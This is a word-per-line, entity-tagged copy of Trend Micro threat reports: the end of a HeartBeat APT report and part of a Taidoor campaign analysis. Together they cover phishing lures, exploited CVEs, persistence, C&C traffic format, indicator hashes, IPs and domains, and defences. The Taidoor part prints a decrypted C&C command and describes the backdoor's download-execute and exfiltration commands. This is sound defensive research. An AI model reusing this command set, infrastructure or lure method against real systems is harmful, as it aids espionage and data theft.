users
and
organizations
.

Not
only
does
it
help
in
coming
up
with
effective
defensive
strategies
through
multiple
protection
layers
,
it
also
helps
with
predicting
possible
targets
in
the
future
and
ultimately
,
raise
awareness
.

As
of
this
writing
,
the
HeartBeat B_malware.drop
APT
campaign
remains
an
active
targeted
campaign
.

timeline

We
collected
19
set
of
samples
related
to
HeartBeat B_malware.drop
campaign
from
November
2009
to
June
2012
.

This
translates
to
19
campaigns
where
the
vast
majority
of
which
were
distributed
between
2011
and
2012
.

Nonetheless
,
the
limited
number
of
samples
we
were
able
to
obtain
still
means
that
the
campaign
is
indeed
persistent
.

The
isolated
nature
of
this
targeted
attack
and
its
small
user
base
may
only
require
the
HeartBeat B_malware.drop
perpetrators
to
carry
out
minimal
campaigns
in
order
to
infiltrate
their
targets
.

Campaign
Date
(
MM/DD/YY
)

MD5
(
.DLL
component
)

11/19/09

03/15/11

04/17/11

05/25/11

09/09/111

09/16/11

09/25/11

10/22/11

11/03/11

11/13/11

12/2011

02/2012

03/05/12

03/26/12

03/28/12

03/29/12

04/2012

05/20/12

7c6b44d8d87898e7e5deeeb1961b5ae6 B_hash

fcf42cadb3a932989c8e2b29cef68861 B_hash

aab129ffd3bf5ceeae2e0f332217bebc B_hash

86547d674e7c7da55e8cae359819832f B_hash

f947e63b14853a69b8ed2648869b5e10 B_hash

7f1a633384ec97fae9d95d1df9e1135a B_hash

8816c5be1305488019769c81259dad2a B_hash

874025a66c2b9d9831c03d1bc114876a B_hash

4046dec1aa0eebb01fe7469184a95398 B_hash

ba370b17dc9eb1d1e1c3187f0768064f B_hash

51274cefb01cee981a09db83c984213d B_hash

d1a2253361045f91ed1902e9ffe2cec3 B_hash

20bb652e1d2679ed230102aa9676eca0 B_hash

c5c0fea23138cddab96fe22b657f9132 B_hash

ef2bc66ea69327d11d1859af26f5aef9 B_hash

8e50af054d2c0b45c88082d53c4fc423 B_hash

b1e47ecd68c1c151866cec275716aa67 B_hash

6d205e78fb7730066c116b0c2dffa398 B_hash

Compile
Date
(
MM/DD/YY
)

9/17/2009

12/24/2010

3/18/2011

5/6/2011

7/25/2011

7/25/2011

9/21/2011

10/17/2011

10/31/2011

10/31/2011

11/28/2011

7/18/2011

3/1/2012

3/8/2012

3/8/2012

3/8/2012

4/18/2012

5/2/2012

06/04/12

5ec175512ba3c6e78597af48bbe6ca60 B_hash

5/2/2012

Table
3
.

Specific
dates
of
HeartBeat B_malware.drop
campaigns

PAGE
10
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

We
did
not
obtain
a
campaign
sample
from
2010
.

However
,
we
highly
suspect
that
their
operation
was
also
active
during
that
year
.

In
fact
,
we
can
see
in
the
second
MD5
above
that
the
sample
was
compiled
in
December
24
,
2010
.

Also
,
it
is
possible
that
some
of
the
campaign
's
attacks
may
not
have
been
escalated
to
antivirus
firms
by
infected
users
,
or
simply
remains
undiscovered
.

that
contain
file
attachments
using
extensions
such
as
.VBS
,
.BAT
,
.EXE
,
.PIF
and
.SCR
files
.

•
Avoid
opening
email
attachments
and
clicking
embedded
links
from
unknown
sources

•
Block
any
file
with
more
than
one
file
type
extension
.

•
When
a
computer
is
compromised
,
isolate
it
immediately
from
the
network
.

•
Configure
your
system
to
show
hidden
files
and
folders
and
display
file
extensions
.

•
Do
n't
save
login
credentials
on
the
local
computer
.

defending
AgAinst
the
HeartBeat B_malware.drop
CAmPAign

Essential
components
of
defense
against
the
HeartBeat B_malware.drop
campaign
are
security-related
policies
within
enterprises
.

Once
an
attack
is
identified
,
a
good
cleanup
strategy
should
focus
on
determining
the
attack
vector
and
cutting
off
communications
with
the
C
&
C
server
.

It
is
also
vital
to
determine
the
scope
of
the
compromise
and
assessing
the
damage
through
data
analysis
and
forensics
.

The
following
best
practices
are
also
advised
:

•
Disable
services
that
are
related
to
the
HeartBeat B_malware.drop
RAT B_malware.backdoor
component
.

•
Enable
system
's
firewall

•
Keep
software
and
operating
systems
updated
with
latest
patches
released
by
vendors
to
address
vulnerabilities
and
exploits
.

•
Block
unused
ports
to
disallow
malware
from
using
these
ports
to
communicate
and/or
enforce
commands
.

•
Monitor
network
connections
for
any
suspicious
connection
or
connectivity
.

•
Regularly
update
list
of
sites
that
are
trusted
.

•
Configure
your
email
server
to
block
or
remove
email

PAGE
11
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

trend
miCro
threAt
ProteCtion
AgAinst
the
HeartBeat B_malware.drop
CAmPAign
ComPonents

The
following
table
summarizes
the
Trend
Micro
solutions
for
the
components
of
the
HeartBeat B_malware.drop
campaign
.

Trend
Micro
recommends
a
comprehensive
security
risk
management
strategy
that
goes
further
than
advanced
protection
to
meet
the
real-time
threat
management
requirements
of
dealing
with
targeted
attacks
.

Attack
Component

Protection
Technology

Trend
Micro
Solution

Endpoint
(
Titanium
,
Worry-Free
Business
Security
,
OfficeScan
)
Server
(
Deep
Security
)
Messaging
(
InterScan
Messaging
Security
,
ScanMail
Suite
for
Microsoft
Exchange
)
Network
(
Deep
Discovery
)
Gateway
(
InterScan
Web
Security
,
InterScan
Messaging
Security
)
Mobile
(
Mobile
Security
)

Endpoint
(
Titanium
,
Worry-Free
Business
Security
,
OfficeScan
)
Server
(
Deep
Security
)
Messaging
(
InterScan
Messaging
Security
,
ScanMail
Suite
for
Microsoft
Exchange
)
Network
(
Deep
Discovery
)
Gateway
(
InterScan
Web
Security
,
InterScan
Messaging
Security
)
Mobile
(
Mobile
Security
)

Endpoint
(
Titanium
,
Worry-Free
Business
Security
,
OfficeScan
)
Server
(
Deep
Security
)
Messaging
(
InterScan
Messaging
Security
,
ScanMail
Suite
for
Microsoft
Exchange
)
Network
(
Deep
Discovery
)
Gateway
(
InterScan
Web
Security
,
InterScan
Messaging
Security
)
Mobile
(
Mobile
Security
)

HeartBeat B_malware.drop
TCP
communication
is
blocked
in
the
network
layer
as
TCP_HBEAT_REQUEST

Web
Reputation

TROJ_DRPBEAT
and
BKDR_HBEAT
variants

File
Reputation
(
Antivirus/Anti-malware
)

Web
,
Domain
,
and
IP
Reputation

XXX.XXX.217.123 B_ip.attack

XXX.XX.121.84 B_ip.attack

XX.XXX.203.122 B_ip.attack

XX.XXX.20.103 B_ip.attack

XXX.XXX.217.123 B_ip.attack

XXX.XX.121.84 B_ip.attack

XXX.XXX.178.50 B_ip.attack

XX.XXX.15.63 B_ip.attack

XXX.XXX.198.93 B_ip.attack

XXX.XXX.169.45 B_ip.attack

XXX.XXX.178.50 B_ip.attack

XXX.XXX.217.123 B_ip.attack

XX.XXX.136.115 B_ip.attack

XXX.XXX.178.50 B_ip.attack

XXX.XXX.4.180 B_ip.attack

XX.XXX.203.122 B_ip.attack

ahnlab.myfw.us B_url.cncsvr

kissyou01.myfw.us B_url.cncsvr

kita.myfw.us B_url.cncsvr

login.sbs.com.PassAs.us B_url.cncsvr

mail2.myfw.us B_url.cncsvr

park007.myfw.us B_url.cncsvr

snrp.UglyAs.com B_url.cncsvr

www.banking.com.PassAs.us B_url.cncsvr

www.huyang.go.kr.PassAs.us B_url.cncsvr

www.kinu.or.kr.rr.nu B_url.cncsvr

www.kndu.ac.kr.myfw.us B_url.cncsvr

young03.myfw.us B_url.cncsvr

PAGE
12
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

December
2012
|
APT
Campaign
Quick
Profile
:
HeartBeat B_malware.drop

Advanced
persistent
threats
(
APTs
)
refer
to
a
category
of
threats
that
aggressively
pursue
and
compromise
specific
targets
to
maintain
persistent
presence
within
the
victim
's
network
so
they
can
move
laterally
and
exfiltrate
data
.

Unlike
indiscriminate
cybercrime
attacks
,
spam
,
web
threats
,
and
the
like
,
APTs
are
much
harder
to
detect
because
of
the
targeted
nature
of
related
components
and
techniques
.

Also
,
while
cybercrime
focuses
on
stealing
credit
card
and
banking
information
to
gain
profit
,
APTs
are
better
thought
of
as
cyber
espionage
.

HeartBeat B_malware.drop

•
First
Seen

Individual
targeted
attacks
are
not
one-off
attempts
.

Attackers
continually
try
to
get
inside
the
target
's
network
.

The
'HeartBeat B_malware.drop
'
campaign
has
been
persistently
pursuing
government
agencies
since
2009
.

The
samples
collected
related
to
this
campaign
covered
attacks
seen
from
November
2009
to
June
2012
,
although
majority
of
the
attacks
were
seen
in
2011
and
2012
.

•
Victims
and
Targets

APT
campaigns
target
specific
industries
or
communities
of
interest
in
specific
regions
.

The
HeartBeat B_malware.drop
campaign
targets
South
Korean
government
organizations
and
institutions
like
political
parties
,
media
outfits
,
a
national
policy
research
institute
,
a
military
branch
of
South
Korean
armed
forces
,
a
small
business
sector
organization
,
and
branches
of
the
South
Korean
government
.

•
Operations

The
1st-stage
computer
intrusions
often
use
social
engineering
.

Attackers
custom-fit
attacks
to
their
targets
.

The
threat
actors
behind
HeartBeat B_malware.drop
install
a
RAT B_malware.backdoor
in
system
.

The
RAT B_malware.backdoor
arrives
as
a
disguised
or
fake
document
which
is
actually
a
bundled
file
.

The
bundled
file
contains
both
a
decoy
document
and
the
RAT B_malware.backdoor
installer
that
has
been
packaged
together
using
a
binder
tool
.

The
campaign
's
decoy
documents
used
the
file
formats
.JPG
,
.PDF
,
XLS
,
and
HWP
,
the
Korean
government
standard
word
processor
format
.

•
Possible
Indicators
of
Compromise

Attackers
want
to
remain
undetected
as
long
as
possible
.

A
key
characteristic
of
these
attacks
is
stealth
.

The
following
indicators
suggest
an
infection
by
the
HeartBeat B_malware.drop
campaign
:
contiguous
02H
bytes
communication
in
the
network
,
the
presence
of
certain
files
and
registries
as
detailed
in
the
paper
,
and
network
connections
to
certain
IPs
and
domains
,
including
the
presence
of
files
detected
as
TROJ_DRPBEAT
and
BKDR_HBEAT
.

•
Relationship
with
other
APT
Campaigns

This
attack
does
not
seem
to
have
any
relationship
with
other
APT
campaigns
.

PAGE
13
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN

TREND
MICRO
INCORPORATED

Trend
Micro
Incorporated
(
TYO
:
4704
;
TSE
:
4704
)
,
a
global
cloud
security
leader
,
creates
a
world
safe
for
exchanging
digital
information
with
its
Internet
content
security
and
threat
management
solutions
for
businesses
and
consumers
.

A
pioneer
in
server
security
with
over
20
years
'
experience
,
we
deliver
top-ranked
client
,
server
and
cloud-based
security
that
fits
our
customers
'
and
partners
'
needs
,
stops
new
threats
faster
,
and
protects
data
in
physical
,
virtualized
and
cloud
environments
.

Powered
by
the
industry-leading
Trend
MicroTM
Smart
Protection
NetworkTM
cloud
computing
security
infrastructure
,
our
products
and
services
stop
threats
where
they
emerge—from
the
Internet
.

They
are
supported
by
1,000+
threat
intelligence
experts
around
the
globe
.

TREND
MICRO
INC
.

10101
N
.

De
Anza
Blvd
.

Cupertino
,
CA
95014

U.S.
toll
free
:
1
+800.228.5651

Phone
:
1
+408.257.1500

Fax
:
1
+408.257.2003

www.trendmicro.com B_url.normal

©2012
by
Trend
Micro
,
Incorporated
.

All
rights
reserved
.

Trend
Micro
and
the
Trend
Micro
t-ball
logo
are
trademarks
or
registered
trademarks
of
Trend
Micro
,
Incorporated
.

All
other
product
or
company
names
may
be
trademarks
or
registered
trademarks
of
their
owners
.

PAGE
14
|
THE
HeartBeat B_malware.drop
APT
CAMPAiGN
Trend
Micro
Incorporated
Research
Paper
2012

The
Taidoor B_malware.drop
Campaign

AN
IN-DEPTH
ANALYSIS

By
:
Trend
Micro
Threat
Research
Team

CONTENTS

Introduction
............................................................................................................................
1

Detection
.................................................................................................................................
1

Context
...................................................................................................................................
2

Attack
Vectors
......................................................................................................................
2

Social
Engineering
Ploy
.................................................................................................
2

Operations
.............................................................................................................................
3

Technical
Indicators............................................................................................................
3

System
Modifications
.....................................................................................................
3

Persistence
Mechanism
.................................................................................................
3

Network
Traffic
................................................................................................................
3

Malware
Analysis
.............................................................................................................
4

Arrival
Vectors
.............................................................................................................
4

Exploits
,
Payloads
,
and
Decoy
Documents
..........................................................
4

Network
Communication
..........................................................................................
5

Complete
List
of
C
&
C
Commands
..........................................................................
6

Timeline
..................................................................................................................................
7

Damage
.................................................................................................................................
10

Defending
Against
APTs
..................................................................................................
10

Local
and
External
Threat
Intelligence
...................................................................
10

Mitigation
and
Cleanup
Strategy
................................................................................
11

Educating
Employees
Against
Social
Engineering
................................................
11

Data-Centric
Protection
Strategy
..............................................................................
11

Trend
Micro
Threat
Protection
Against
Taidoor B_malware.drop
Campaign
Components
........
12

i
|
TheTaidoorCampaign

INTRODUCTION

DETECTION

Taidoor B_malware.drop
malware
,
detected
by
Trend
Micro
as
BKDR_SIMBOT B_malware.drop
variants
,
have
been
historically
documented
for
their
use
in
targeted
attacks
.

Using
techniques
developed
to
match
the
network
traffic
Taidoor B_malware.drop
malware
generate
when
communicating
with
a
command-and-control
(
C
&
C
)
server
,
we
were
able
to
identify
victims
that
these
appeared
to
have
compromised
.

All
of
the
compromise
victims
we
discovered
were
from
Taiwan
,
the
majority
of
which
were
government
organizations
.

Looking
at
threat
intelligence
derived
from
tracking
advanced
persistent
threat
(
APT
)
campaigns
over
time
,
we
were
able
to
develop
indicators
of
compromise
primarily
based
on
the
network
traffic
generated
by
the
malware
used
in
the
Taidoor B_malware.drop
campaign
.

Using
data
collected
from
the
Trend
MicroTM
Smart
Protection
NetworkTM
,
we
are
able
to
identify
victims
whose
networks
communicated
with
Taidoor B_malware.drop
C
&
C
servers
.

While
we
are
unable
to
determine
the
exact
method
by
which
any
of
the
victims
'
networks
were
compromised
,
the
information
we
collected
did
indicate
which
specific
Taidoor B_malware.drop
malware
samples
contacted
which
C
&
C
servers
.

We
also
obtained
email
samples
associated
with
the
delivery
of
the
Taidoor B_malware.drop
malware
samples
.

As
such
,
we
were
able
to
provide
an
overview
of
the
Taidoor B_malware.drop
campaign
,
including
the
attack
vectors
and
malware
the
attackers
used
,
and
come
up
with
a
remediation
strategy
.

1
|
TheTaidoorCampaign

CONTEXT

ATTACK
VECTORS

The
Taidoor B_malware.drop
attackers
have
been
actively
engaging
in
targeted
attacks
since
at
least
March
4
,
2009
.

Despite
some
exceptions
,
the
Taidoor B_malware.drop
campaign
often
used
Taiwanese
IP
addresses
as
C
&
C
servers
and
email
addresses
to
send
out
socially
engineered
emails
with
malware
as
attachments
.

One
of
the
primary
targets
of
the
Taidoor B_malware.drop
campaign
appeared
to
be
the
Taiwanese
government
.

The
attackers
spoofed
Taiwanese
government
email
addresses
to
send
out
socially
engineered
emails
in
the
Chinese
language
that
typically
leveraged
Taiwan-themed
issues
.

The
attackers
actively
sent
out
malicious
documents
and
maintained
several
IP
addresses
for
command
and
control
.

2
|
TheTaidoorCampaign

The
Taidoor B_malware.drop
campaign
exploits
a
wide
variety
of
vulnerabilities
as
attack
vectors
,
old
and
new
alike
.

Data
from
the
early
part
of
this
year
shows
that
the
Taidoor B_malware.drop
attackers
rampantly
used
malicious
.DOC
files
to
exploit
a
Microsoft
Common
Controls
vulnerability
,
CVE-2012-0158.1

Historical
data
,
on
the
other
hand
,
shows
that
the
Taidoor B_malware.drop
attackers
also
distributed
emails
with
malicious
.PDF
file
attachments
that
exploited
Adobe
Reader
,
Acrobat
,
or
Flash
Player
vulnerabilities
(
e.g.
,
CVE-2009-2CVE-2010-1297,3
CVE-2010-2883,4
and
CVE-2011-4324
,
0611).5
They
also
used
malicious
Microsoft
Excel
and
PowerPoint
files
(
e.g.
,
CVE-2011-12696
and
CVE-2009-3129
)
7
to
exploit
old
vulnerabilities
in
Microsoft
Office
.

Social
Engineering
Ploy
As
part
of
their
social
engineering
ploy
,
the
Taidoor B_malware.drop
attackers
attach
a
decoy
document
to
their
emails
that
,
when
opened
,
displays
the
contents
of
a
legitimate
document
but
executes
a
malicious
payload
in
the
background
.

1
http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158 B_url.unknown

2
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-4324 B_url.unknown

3
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-1297 B_url.unknown

4
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-2883 B_url.unknown

5
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-0611 B_url.unknown

6
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-1269 B_url.unknown

7
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-3129 B_url.unknown

OPERATIONS

TECHNICAL
INDICATORS

We
were
only
able
to
gather
a
limited
amount
of
information
regarding
the
Taidoor B_malware.drop
attackers
'
activities
after
they
have
compromised
a
target
.

We
did
,
however
,
find
that
the
Taidoor B_malware.drop
malware
allowed
attackers
to
operate
an
interactive
shell
on
compromised
computers
and
to
upload
and
download
files
.

In
order
to
determine
the
operational
capabilities
of
the
attackers
behind
the
Taidoor B_malware.drop
campaign
,
we
monitored
a
compromised
honeypot
.

The
attackers
issued
out
some
basic
commands
in
an
attempt
to
map
out
the
extent
of
the
network
compromise
but
quickly
realized
that
the
honeypot
was
not
an
intended
targeted
and
so
promptly
disabled
the
Taidoor B_malware.drop
malware
running
on
it
.

This
indicated
that
while
Taidoor B_malware.drop
malware
were
more
widely
distributed
compared
with
those
tied
to
other
targeted
campaigns
,
the
attackers
could
quickly
assess
their
targets
and
distinguish
these
from
inadvertently
compromised
computers
and
honeypots
.

System
Modifications

Opening
a
malicious
document
(
i.e.
,
.PDF
,
.DOC
,
.XLS
,
or
.PPT
file
)
allows
the
Taidoor B_malware.drop
malware
to
create
two
files
in
a
user
's
Temp
folder—C
:
\Documents
and
Settings\
[
USER
]
\Local
Settings\Temp
.

The
first
file
is
typically
a
small
executable
file
(
i.e.
,
17.5KB
)
named
'
[
2
characters].tmp
.
'

This
is
copied
to
another
folder
,
usually
C
:
\Documents
and
Settings\
[
USER
]
\Local
Settings
,
and
renamed
to
'~dfds3.reg
,
'
which
modifies
the
Windows
Registry
before
being
deleted
.

Persistence
Mechanism

The
Taidoor B_malware.drop
malware
uses
the
file
,
~dfds3.reg
,
to
modify
the
Windows
Registry
in
order
to
maintain
persistence
.

While
the
names
of
the
registry
entries
and
the
executable
files
may
vary
,
these
consistently
modified
the
key
,
HKCU\SOFTWARE\Microsoft\Windows\
CurrentVersion\Run
.

Network
Traffic

The
Taidoor B_malware.drop
malware
produces
identifiable
network
traffic
.

These
often
directly
accessed
an
IP
address
.

Sometimes
,
however
,
certain
samples
made
use
of
domain
names
for
HTTP
communication
.

In
such
a
case
,
the
GET
and
POST
requests
contained
a
URL
path
such
as
:
aaaaa.php?id=bbbbbbcccccccccccc
'aaaaa
'
refers
to
five
random
characters
that
form
a
file
name
such
as
'qfgkt.php
,
'
followed
by
'bbbbbb
,
'
six
pseudorandomly
generated
characters
that
change
for
each
connection
.

'cccccccccccc
'
refers
to
12
characters
that
represent
the
compromised
host
's
MAC
address
that
is
obfuscated
using
a
custom
algorithm
.

The
compromised
host
's
MAC
address
is
communicated
to
the
Taidoor B_malware.drop
C
&
C
server
this
way
because
it
is
used
as
an
RC4
encryption
key
to
encrypt
the
subsequent
network
communication
between
the
compromised
host
and
the
C
&
C
server
.

3
|
TheTaidoorCampaign

Malware
Analysis

Arrival
Vectors

The
majority
of
the
Taidoor B_malware.drop
malware
samples
we
have
seen
in
the
wild
were
delivered
via
email
.

We
also
saw
considerable
variations
among
the
email
and
IP
addresses
the
senders
used
.

We
listed
down
some
of
the
emails
that
were
sent
via
an
IP
address
that
also
served
as
a
C
&
C
server
below
.

This
was
one
of
the
IP
addresses
that
some
compromised
systems
accessed
.

While
we
do
not
exactly
know
how
the
compromises
occurred
,
we
can
,
based
on
the
attackers
'
method
of
operation
,
determine
which
email
was
the
most
likely
attack
vector
.

•
Sample
email
1
8

•
From
:
minaki.yang@yahoo.com

•
Subject
:
US-TAIWAN

•
Date
sent
:
October
25
,
2011

•
Sender
's
IP
address
:
60.249.219.82 B_ip.cncsvr

•
MD5
hash
:
97ff2338e568fc382d41c30c31f89720 B_hash

•
Sample
email
2
9

•
From
:
[
redacted]@wpafb.af.mil

•
Subject
:
20111012

•
Sender
's
IP
address
:
60.249.219.82 B_ip.cncsvr

•
MD5
hash
:
5fd848000d68f45271a0e1abd5844493 B_hash

•
Sample
email
3
10

•
From
:
95273503@nccu.edu.tw

•
Subject
:
稿件
如附檔
,
請收悉

•
Sender
's
IP
address
:
60.249.219.82 B_ip.cncsvr

•
MD5
hash
:
8406c1ae494add6e4f0e78b476fb4db0  B_hash

Exploits
,
Payloads
,
and
Decoy
Documents

The
shellcode
in
the
exploit
document
is
commonly
encrypted
.

To
successfully
exploit
a
vulnerability
,
the
shellcode
is
first
decrypted
.

It
then
searches
for
the
filehandle
of
the
exploit
document
by
comparing
the
file
sizes
of
enumerated
handles
to
a
hardcoded
file
size
that
is
supposed
to
be
that
of
the
exploit
document
.

Once
the
handle
is
found
,
two
buffers
are
read
from
the
exploit
document
,
which
contains
the
encrypted
payload
and
an
encrypted
decoy
document
.

The
payload
is
then
decrypted
and
saved
as
a
file
in
the
Windows
temporary
directory
.

The
payload
is
then
commonly
executed
using
the
WinExec
application
programming
interface
(
API
)
.

After
the
payload
is
executed
,
the
decoy
document
is
decrypted
and
also
saved
in
the
Windows
temporary
directory
.

The
decoy
document
is
then
opened
in
a
new
window
of
the
exploited
application
to
convince
the
victim
that
nothing
is
wrong
with
his/her
system
.

The
process
that
executed
the
exploit
shellcode
is
then
terminated
.

Keen
observation
would
also
reveal
that
the
document
a
victim
opened
was
a
decoy
because
its
file
name
differs
from
the
name
of
the
original
document
that
was
exploited
.

The
main
purpose
of
the
specially
crafted
file
attachments
is
to
silently
drop
and
install
BKDR_SIMBOT B_malware.drop
variants
in
the
target
's
computer
.

11
These
BKDR_SIMBOT B_malware.drop
variants
include
BKDR_SIMBOT.SMXA
and
BKDR_SIMBOT.SME
,
the
generic
Trend
Micro
detection
names
for
SIMBOT B_malware.drop
malware
.

In
other
instances
,
the
binary
poses
as
an
Adobe
Flash
Player
installer
or
uninstaller
with
a
file
size
of
17,925
bytes
.

The
file
was
written
using
Borland
's
Delphi
,
compiled
on
a
machine
whose
default
language
was
set
to
Chinese
(
Simplified
)
,
and
did
not
use
any
known
binary
packer
.

8
http://targetedemailattacks.tumblr.com/post/12137336947/fak B_url.normal
e-excel-from-ibm111

9
http://targetedemailattacks.tumblr.com/post/11377987600/ma B_url.normal
licious-excel

10
http://contagiodump.blogspot.com/2011/10/sep-28-cve-2010-3333-manuscript-with.html B_url.normal

4
|
TheTaidoorCampaign

11
http://about-threats.trendmicro.com/malware.aspx?language=us&name=BK B_url.normal
DR_SIMBOT.SMXA

Figure
2
.

File
structure
of
encrypted
SIMBOT B_malware.drop
malware
variants

Network
Communication

The
binary
file
contacts
the
C
&
C
server
for
commands
that
it
then
executes
on
the
victim
's
machine
.

Communication
with
the
C
&
C
server
is
done
through
HTTP
and
uses
RC4
encryption
for
the
data
sent
and
received
.

Figure
1
.

File
properties
of
the
.TMP
of
the
malicious
executable
file

Figure
3
.

Network
communication
between
a
Taidoor-compromised
machine
and
a
Taidoor B_malware.drop
C
&
C
server

The
initial
request
to
the
C
&
C
server
is
formatted
as
follows
:

[
C
&
C
]
/
{
5
random
characters}.php?id={6
random
numbers
}
{
encrypted
victim
's
MAC
address
}

The
victim
's
MAC
address
is
sent
to
the
C
&
C
server
,
as
this
is
used
as
key
to
encrypt
the
data
exchanged
by
the
victim
's
machine
and
the
C
&
C
server
.

The
MAC
address
is
encrypted
using
a
custom
algorithm
,
which
basically
increases
the
values
in
the
address
by
1
.

The
main
purpose
of
the
dropped
binary
file
is
to
install
an
RC4-encrypted
executable
file
,
specifically
in
the
.data
segment
,
in
the
memory
space
of
a
known
Windows
Service
Process
.

If
the
registry
,
HKLM\SOFTWARE\McAfee
,
is
found
in
the
target
's
machine
,
the
malware
injects
the
executable
file
in
the
services.exe
process
.

If
not
,
it
injects
the
executable
file
in
svchost.exe
.

The
executable
file
is
written
using
C++
and
has
a
file
size
of
about
11,776
bytes
.

It
is
not
protected
nor
packed
using
any
known
binary
protector
or
packer
and
has
a
pretty
straightforward
code
.

The
code
seeks
out
inactive
services
and
pseudorandomly
chooses
one
,
which
it
then
tries
to
kill
.

If
successful
,
it
uses
the
service
's
name
as
file
name
for
the
copy
created
in
the
victim
's
Temp
folder
then
creates
an
autorun
registry
entry
for
the
binary
.

If
not
,
'WinHttp
'
is
prepended
to
the
service
's
name
.

5
|
TheTaidoorCampaign

As
shown
in
Figure
4
,
the
C
&
C
server
responds
with
encrypted
data
.

Since
we
know
the
encryption
algorithm
used
and
that
the
key
is
the
MAC
address
,
we
were
able
to
decrypt
it
.

Complete
List
of
C
&
C
Commands

The
decrypted
C
&
C
command
was
formatted
in
the
following
manner
:

MAC
address
of
analysis
machine
:

08-00-27-33-9C-23
Encrypted
data
:
�*䚔l���S�W
4�T��F+UO

Decrypted
data
:
cmd/c
ipconfig/all

Command
type
:
3

Command
string
:
cmd/c
ipconfig/all

The
decrypted
data
shows
that
the
C
&
C
server
is
interested
in
IP
configuration-related
data
in
the
victim
's
machine
.

The
output
of
the
command
is
then
encrypted
and
sent
to
the
C
&
C
server
.

Table
1
shows
the
full
capabilities
of
the
injected
binary
.

[
command
type
]
[
command
string
]

Command
type
refers
to
a
hex
digit
that
can
be
[
0x2
]
,
[
0x3
]
,
[
0x4
]
,
[
0x5
]
,
or
[
0x7
]
,
which
identifies
what
it
will
do
with
the
command
string
.

Command
string
,
on
the
other
hand
,
refers
to
a
set
of
strings
relevant
to
the
command
type
.

Command

0x2—sleep
command

0x3—execute
commands
on
the
system
(
i.e.
,
cmd/c
ipconfig/all
)

Description

The
binary
waits
for
a
specified
amount
of
time
before
requesting
another
command
from
the
C
&
C
server
.

This
can
be
used
to
explore
the
data
or
files
in
the
victim
's
machine
for
reporting
back
to
the
C
&
C
server
.

This
can
also
be
used
to
explore
the
network
to
which
the
compromised
machine
is
connected
.

0x4—download
and
execute
file

This
can
be
used
to
install
additional
files
in
the
victim
's
machine
.

0x5—download
files
from
the
C
&
C
server

The
binary
downloads
but
does
not
execute
files
from
the
C
&
C
server
.

0x7—upload
files
from
infected
machine
to
the
C
&
C
server

This
can
be
used
to
exfiltrate
data
or
files
from
the
victim
's
network
to
the
C
&
C
server
.

6
|
TheTaidoorCampaign

TIMELINE

Using
the
Taidoor B_malware.drop
C
&
C
servers
we
found
using
Trend
Micro
Smart
Protection
Network
data
,
we
constructed
a
timeline
that
indicates
related
activities
as
early
as
October
2010
(
see
Table
2
)
.

While
we
saw
gaps
in-between
activities
,
notably
between
November
2010
and
February
2011
,
we
consistently
discovered
malware
samples
connect
to
this
infrastructure
.

The
dates
when
these
were
discovered
may
indicate
exact
dates
of
compromise
.

MD5
HASH

DETECTION

C
&
C
SERVER

DATE
SEEN

2d33005a26a9cb2063dde2fa179b453e B_hash

4b92f9b403fa59a35edf5af2f1aa98fb B_hash

95bfeb4b7b8edb2517ede938bf9791d9 B_hash

216.139.109.156 B_ip.cncsvr

10/12/2010

216.139.109.156 B_ip.cncsvr

10/12/2010

216.139.109.156 B_ip.cncsvr

10/12/2010

5dd13efe319f0cdfe75346a46c1b791b B_hash

TROJ_GEN.R42C3JR

211.35.222.6 B_ip.cncsvr

10/14/2010

1de1a60f51829e5e0d30dfd4b5197a72 B_hash

TROJ_DLOADE.SMJ

216.139.109.156 B_ip.cncsvr

10/22/2010

608bae3e4a59e4954f9bf43e504e2340 B_hash

TROJ_GEN.R47E1K9

211.35.222.6 B_ip.cncsvr

10/27/2010

b80da571f2cd7eab4aec12eee8199289 B_hash

TROJ_DLOADE.SMJ

60.250.39.73 B_ip.cncsvr

11/23/2010

0998743b808b57f6707641be64fa4fcd B_hash

TROJ_DLOADR.TDG

211.35.222.6 B_ip.cncsvr

2/25/2011

920a7857da9ee7b403f3077660eddf31 B_hash

TROJ_DLOADR.TDG

211.35.222.6 B_ip.cncsvr

2/25/2011

d28b1b2824fd26d18f851e7605660f74 B_hash

TROJ_GEN.R21C3E6

216.139.109.156 B_ip.cncsvr

4/15/2011

265785ccc9503d30465156b90afa2523 B_hash

TROJ_GEN.R3EC2G4

216.139.109.156 B_ip.cncsvr

4/28/2011

7488ffd5d9c1751d1ceca88a4231304b B_hash

TROJ_GEN.R4FCRBC

216.139.109.156 B_ip.cncsvr

7/7/2011

ecd97b7cfb4c8715d7800a9808a1646f B_hash

TROJ_INJECT.ZZXX

216.139.109.156 B_ip.cncsvr

8/10/2011

6703dd35f6f56f35d298b9cd4c73e9cb B_hash

BKDR_SIMBO.DUKKS

216.139.109.156 B_ip.cncsvr

8/29/2011

8406c1ae494add6e4f0e78b476fb4db0 B_hash

TROJ_ARTIEF.VTG

60.249.219.82 B_ip.cncsvr

10/6/2011

5fd848000d68f45271a0e1abd5844493 B_hash

TROJ_MSDROP.ZZXX

60.249.219.82 B_ip.cncsvr

10/12/2011

a0fff659499a4a76af2b89d28d0eafa2 B_hash

TROJ_GEN.R3EC1J7

216.139.109.156 B_ip.cncsvr

10/14/2011

97ff2338e568fc382d41c30c31f89720 B_hash

HEUR_OLEXP.A

60.249.219.82 B_ip.cncsvr

10/30/2011

d39981092a2f9a4b40413b38917ca573 B_hash

TROJ_GEN.R49C7KI

61.222.205.180 B_ip.cncsvr

11/2/2011

f43c9cc84fa7c16321241bb3c0802760 B_hash

61.222.190.100 B_ip.cncsvr

11/6/2011

7
|
TheTaidoorCampaign

MD5
HASH

DETECTION

C
&
C
SERVER

DATE
SEEN

c2cb594246942c328d8b11d4696a05c0 B_hash

BKDR_SIMBOT.SMC

61.218.233.51 B_ip.cncsvr

4/30/2012

63.135.55.13 B_ip.cncsvr

4/30/2012

65a0716af402727247296649abda7be6 B_hash

BKDR_SIMBOT.SMC

203.146.189.160 B_ip.cncsvr

4/7/2012

